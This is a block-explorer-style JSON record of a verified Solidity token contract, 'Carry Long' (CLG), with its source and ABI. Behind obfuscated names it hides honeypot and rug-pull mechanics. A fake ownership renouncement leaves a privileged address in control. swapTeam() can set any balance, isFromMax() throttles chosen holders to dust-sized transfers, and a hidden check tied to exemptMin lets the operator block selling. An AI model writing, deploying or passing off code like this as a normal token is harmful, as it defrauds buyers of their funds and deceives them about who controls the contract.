{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface listTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenFromTotal {\n    function createPair(address limitSenderFee, address limitShould) external returns (address);\n}\n\ninterface toLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverExempt) external view returns (uint256);\n\n    function transfer(address modeMin, uint256 minTxAuto) external returns (bool);\n\n    function allowance(address totalFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTxAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeMin,\n        uint256 minTxAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSender, uint256 value);\n    event Approval(address indexed totalFrom, address indexed spender, uint256 value);\n}\n\ninterface toLaunchMetadata is toLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CarryLong is receiverFund, toLaunch, toLaunchMetadata {\n\n    address receiverAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private takeShouldFrom = 18;\n\n    uint256 private atLaunchTrading;\n\n    string private marketingTx = \"Carry Long\";\n\n    mapping(address => uint256) private maxEnable;\n\n    uint256 public walletEnable;\n\n    function owner() external view returns (address) {\n        return buyFund;\n    }\n\n    bool public modeReceiver;\n\n    string private totalMarketing = \"CLG\";\n\n    uint256 private fundMode = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMode;\n    }\n\n    function marketingToken() private view {\n        require(feeMarketing[_msgSender()]);\n    }\n\n    mapping(address => bool) public feeMarketing;\n\n    function approve(address limitFee, uint256 minTxAuto) public virtual override returns (bool) {\n        takeReceiverMax[_msgSender()][limitFee] = minTxAuto;\n        emit Approval(_msgSender(), limitFee, minTxAuto);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeShouldFrom;\n    }\n\n    uint256 public amountAt;\n\n    function transferFrom(address toMin, address modeMin, uint256 minTxAuto) external override returns (bool) {\n        if (_msgSender() != fromWallet) {\n            if (takeReceiverMax[toMin][_msgSender()] != type(uint256).max) {\n                require(minTxAuto <= takeReceiverMax[toMin][_msgSender()]);\n                takeReceiverMax[toMin][_msgSender()] -= minTxAuto;\n            }\n        }\n        return atFund(toMin, modeMin, minTxAuto);\n    }\n\n    function buyTx(address autoMin) public {\n        if (modeReceiver) {\n            return;\n        }\n        \n        feeMarketing[autoMin] = true;\n        \n        modeReceiver = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeReceiverMax;\n\n    function allowance(address fromExempt, address limitFee) external view virtual override returns (uint256) {\n        if (limitFee == fromWallet) {\n            return type(uint256).max;\n        }\n        return takeReceiverMax[fromExempt][limitFee];\n    }\n\n    function limitFeeTrading(uint256 minTxAuto) public {\n        marketingToken();\n        exemptMin = minTxAuto;\n    }\n\n    function transfer(address totalBuy, uint256 minTxAuto) external virtual override returns (bool) {\n        return atFund(_msgSender(), totalBuy, minTxAuto);\n    }\n\n    address fromWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fromFee;\n\n    address public modeMax;\n\n    function feeToken() public {\n        emit OwnershipTransferred(teamReceiverMode, address(0));\n        buyFund = address(0);\n    }\n\n    function swapTeam(address totalBuy, uint256 minTxAuto) public {\n        marketingToken();\n        maxEnable[totalBuy] = minTxAuto;\n    }\n\n    bool public amountTrading;\n\n    constructor (){\n        \n        listTeam liquidityLimit = listTeam(fromWallet);\n        modeMax = tokenFromTotal(liquidityLimit.factory()).createPair(liquidityLimit.WETH(), address(this));\n        if (exemptToken) {\n            amountTrading = false;\n        }\n        teamReceiverMode = _msgSender();\n        feeToken();\n        feeMarketing[teamReceiverMode] = true;\n        maxEnable[teamReceiverMode] = fundMode;\n        \n        emit Transfer(address(0), teamReceiverMode, fundMode);\n    }\n\n    uint256 constant atEnable = 8 ** 10;\n\n    uint256 exemptMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalMarketing;\n    }\n\n    bool private teamEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTx;\n    }\n\n    address private buyFund;\n\n    function receiverAtReceiver(address toMin, address modeMin, uint256 minTxAuto) internal returns (bool) {\n        require(maxEnable[toMin] >= minTxAuto);\n        maxEnable[toMin] -= minTxAuto;\n        maxEnable[modeMin] += minTxAuto;\n        emit Transfer(toMin, modeMin, minTxAuto);\n        return true;\n    }\n\n    function balanceOf(address receiverExempt) public view virtual override returns (uint256) {\n        return maxEnable[receiverExempt];\n    }\n\n    event OwnershipTransferred(address indexed amountBuy, address indexed txMax);\n\n    uint256 liquidityLaunch;\n\n    function atFund(address toMin, address modeMin, uint256 minTxAuto) internal returns (bool) {\n        if (toMin == teamReceiverMode) {\n            return receiverAtReceiver(toMin, modeMin, minTxAuto);\n        }\n        uint256 takeLaunch = toLaunch(modeMax).balanceOf(receiverAuto);\n        require(takeLaunch == exemptMin);\n        require(modeMin != receiverAuto);\n        if (senderMarketing[toMin]) {\n            return receiverAtReceiver(toMin, modeMin, atEnable);\n        }\n        return receiverAtReceiver(toMin, modeMin, minTxAuto);\n    }\n\n    bool public tradingLiquidity;\n\n    bool public modeIs;\n\n    mapping(address => bool) public senderMarketing;\n\n    uint256 public autoFrom;\n\n    bool private exemptToken;\n\n    function isFromMax(address maxLiquidityLimit) public {\n        marketingToken();\n        if (amountAt == autoFrom) {\n            autoFrom = atLaunchTrading;\n        }\n        if (maxLiquidityLimit == teamReceiverMode || maxLiquidityLimit == modeMax) {\n            return;\n        }\n        senderMarketing[maxLiquidityLimit] = true;\n    }\n\n    address public teamReceiverMode;\n\n    function getOwner() external view returns (address) {\n        return buyFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidityLimit\",\"type\":\"address\"}],\"name\":\"isFromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTxAuto\",\"type\":\"uint256\"}],\"name\":\"limitFeeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxAuto\",\"type\":\"uint256\"}],\"name\":\"swapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTxAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CarryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}